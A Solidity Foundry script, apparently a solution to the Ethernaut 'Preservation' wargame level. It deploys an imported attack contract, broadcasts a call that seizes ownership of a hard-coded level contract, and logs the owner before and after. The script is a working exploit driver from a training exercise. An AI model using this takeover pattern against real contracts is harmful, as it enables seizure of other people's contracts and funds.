// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {PreservationAttack} from "../src/attacks/PreservationAttack.sol";
import {Preservation} from "../src/levels/Preservation.sol";

contract PreservationScript is Script {
    Preservation preservation = Preservation(payable(0xd58383BBb280B9456D5E5aF9afd9bCb0f6926915));
    PreservationAttack attacker;

    function run() external {
	vm.startBroadcast();
	attacker = new PreservationAttack();
	console.log("PreservationAttack Contract deployed to:", address(attacker));
	console.log("Preservation Contract initial owner:", preservation.owner());
	console.log("Attacking...");
	attacker.attack(address(preservation));
	console.log("Preservation Contract new owner:", preservation.owner());
	vm.stopBroadcast();
    }
}
